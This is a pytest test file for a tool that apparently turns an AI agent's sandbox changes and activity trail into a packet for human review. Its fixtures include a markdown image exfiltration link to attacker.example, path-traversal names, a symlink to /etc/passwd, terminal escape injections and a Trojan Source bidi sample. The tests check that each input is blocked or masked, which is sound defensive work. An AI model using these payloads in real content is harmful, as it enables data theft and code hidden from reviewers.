import re

import pytest

import review
from review import Change, Packet, collect_changes, export, make_activity, safe_path, to_markdown, to_terminal, unified
from tests.fakes import FakeSandbox, entry


def collect(original, sandbox):
    return collect_changes(original, sandbox.files.list(".", recursive=True, max_count=review.MAX_ENTRIES), sandbox.files.read)


def test_changes_cover_modified_added_and_deleted_files_and_skip_unchanged():
    sb = FakeSandbox()
    sb.fs.update({"a.py": "x = 2\n", "new.py": "y = 1\n", "same.py": "s\n"})
    changes = collect({"a.py": "x = 1\n", "gone.py": "g\n", "same.py": "s\n"}, sb)
    assert [(c.path, c.status) for c in changes] == [("a.py", "modified"), ("gone.py", "deleted"), ("new.py", "added")]


def test_caches_are_ignored():
    sb = FakeSandbox()
    sb.fs.update({"pkg/__pycache__/m.cpython-312.pyc": b"\x00\x01", ".pytest_cache/v/x": "1", "m.pyc": b"\x00"})
    assert collect({}, sb) == []


def test_symlinks_binaries_and_large_files_are_listed_but_never_exportable(monkeypatch):
    monkeypatch.setattr(review, "MAX_FILE_BYTES", 10)
    sb = FakeSandbox()
    sb.fs.update({"big.txt": "x" * 11, "blob.bin": b"\xff\xfe\x00"})
    sb.links["a.py"] = "/etc/passwd"  # replaces an original file: skipped, not reported as deleted
    changes = collect({"a.py": "x\n"}, sb)
    assert [(c.path, c.status) for c in changes] == [("a.py", "skipped"), ("big.txt", "skipped"), ("blob.bin", "skipped")]
    assert "symlink" in changes[0].note and "/etc/passwd" in changes[0].note
    assert "large" in changes[1].note and "binary" in changes[2].note


@pytest.mark.parametrize("path", ["/etc/passwd", "../x", "a/../../x", "a//b", "", "a\x1b[2Jb", "C:\\x", "a\\b"])
def test_unsafe_paths_are_rejected(path):
    assert not safe_path(path)


@pytest.mark.parametrize("path", ["a.py", "pkg/mod.py", ".env", "tests/test_x.py"])
def test_ordinary_paths_are_safe(path):
    assert safe_path(path)


def test_unsafe_sandbox_path_is_skipped_without_being_read():
    reads = []
    changes = collect_changes({}, [entry("../escape.py", size=3)], lambda p: reads.append(p) or b"bad")
    assert [(c.status, c.note) for c in changes] == [("skipped", "unsafe path")] and reads == []


def test_unified_diff_is_git_style_for_each_status():
    assert unified(Change("a.py", "modified", "x = 1\n", "x = 2\n")).splitlines()[:2] == ["--- a/a.py", "+++ b/a.py"]
    assert unified(Change("n.py", "added", None, "y\n")).splitlines()[:2] == ["--- /dev/null", "+++ b/n.py"]
    assert unified(Change("g.py", "deleted", "g\n", None)).splitlines()[:2] == ["--- a/g.py", "+++ /dev/null"]
    assert unified(Change("s", "skipped", None, None, "symlink")) == ""


def test_unified_diff_marks_a_missing_final_newline():
    out = unified(Change("a.py", "modified", "x\n", "x\ny"))
    assert out.endswith("+y\n\\ No newline at end of file\n")


def test_activity_keeps_only_records_after_the_setup_boundary_and_flags_sensitive_reads_and_deletes():
    sb = FakeSandbox()
    sb.record("fs.write", target=".env")  # the script's setup upload
    boundary = sb.trail[-1].at
    sb.record("fs.read", target=".env")
    sb.record("fs.read", target="home/.ssh/id_ed25519")
    sb.record("exec", command="rm")
    sb.record("exec")
    sb.record("fs.write", target="signup.py")
    rows = make_activity(list(reversed(sb.trail)), boundary)
    assert [r.group for r in rows] == ["fs.read", "fs.read", "exec rm", "exec (program not recorded)", "fs.write"]
    assert [r.flag for r in rows] == ["sensitive read", "sensitive read", "delete", None, None]
    assert rows[0].offset_s == 0 and rows[-1].offset_s == 4


def test_activity_masks_the_credential_and_strips_control_characters():
    sb = FakeSandbox()
    sb.record("fs.read", target="x\x1b]0;pwned\x07.py")
    row = make_activity(sb.trail, None)[0]
    assert row.credential == "c0de0001" and "\x1b" not in row.target and "\x07" not in row.target


def packet(**kw):
    sb = FakeSandbox()
    sb.record("fs.read", target=".env")
    sb.record("fs.write", target="signup.py")
    base = dict(sandbox="review-gate-1", model="m", task="add validation", summary="Added checks.",
                changes=[Change("signup.py", "modified", "a\n", "b\n"), Change("link", "skipped", None, None, "symlink")],
                activity=make_activity(sb.trail, None), agent_calls=2, retention_days=30)
    base.update(kw)
    return Packet(**base)


def test_terminal_packet_shows_diff_activity_flags_and_the_gap():
    out = to_terminal(packet())
    assert "-a\n+b" in out and "signup.py" in out
    assert "sensitive read" in out and "fs.read" in out
    assert "link" in out and "not exported" in out
    assert "program" in out  # what the trail does not record


def test_terminal_packet_warns_when_the_trail_is_missing_calls():
    assert "1 of the agent's 3 calls" in to_terminal(packet(activity=packet().activity[:1], agent_calls=3))


def test_packet_text_from_the_sandbox_cannot_inject_terminal_escapes():
    out = to_terminal(packet(summary="ok\x1b[2J", changes=[Change("a.py", "modified", "a\n", "b\x1b]52;c;x\x07\n")]))
    assert "\x1b" not in out and "\x07" not in out


def test_markdown_fence_is_longer_than_any_backtick_run_in_the_diff():
    md = to_markdown(packet(changes=[Change("README.md", "modified", "a\n", "```python\nx\n```\n")]))
    assert "\n````diff\n" in md and "\n````\n" in md
    assert "# Review packet" in md and "| `fs.read` |" in md


def test_export_writes_only_added_and_modified_files_inside_the_folder(tmp_path):
    out = tmp_path / "approved" / "run"
    changes = [Change("pkg/a.py", "modified", "x\n", "y\n"), Change("new.py", "added", None, "n\n"),
               Change("gone.py", "deleted", "g\n", None), Change("link", "skipped", None, None, "symlink")]
    written = export(changes, out)
    assert sorted(p.relative_to(out).as_posix() for p in written) == ["new.py", "pkg/a.py"]
    assert (out / "pkg/a.py").read_text() == "y\n" and not (out / "gone.py").exists()


def test_export_refuses_any_path_outside_the_folder_before_writing_anything(tmp_path):
    out = tmp_path / "approved"
    with pytest.raises(ValueError, match="unsafe path"):
        export([Change("ok.py", "added", None, "x\n"), Change("../evil.py", "added", None, "x\n")], out)
    assert not out.exists() and not (tmp_path / "evil.py").exists()


def test_export_refuses_an_existing_folder(tmp_path):
    with pytest.raises(FileExistsError):
        export([Change("a.py", "added", None, "x\n")], tmp_path)


def test_markdown_from_the_sandbox_or_model_is_inert():
    image = "![](https://attacker.example/p?k=v)"
    md = to_markdown(packet(summary=f"Done. {image}", task="<img src=x>",
                            changes=[Change(f"{image}.py", "added", None, "x\n")]))
    prose = re.sub(r"`+[^`]*`+", "", re.sub(r"(?ms)^(`{3,})\w*\n.*?^\1$", "", md))  # drop fences, then code spans
    assert "![" not in prose and "<img" not in prose and "](" not in prose


def test_hidden_unicode_is_masked_and_the_file_is_called_out():
    trojan = 'access = "user\u202e \u2066// admin\u2069 \u2066"\n'
    p = packet(changes=[Change("auth.py", "added", None, trojan)])
    out, md = to_terminal(p), to_markdown(p)
    assert not any(ch in out + md for ch in "\u202e\u2066\u2069")
    assert "hidden characters" in out and "hidden characters" in md


def test_a_file_that_grew_after_listing_is_skipped_by_its_real_size(monkeypatch):
    monkeypatch.setattr(review, "MAX_FILE_BYTES", 10)
    changes = collect_changes({}, [entry("big.py", size=1)], lambda p: b"x" * 11)
    assert [(c.status, c.note) for c in changes] == [("skipped", "too large to review (11 bytes)")]
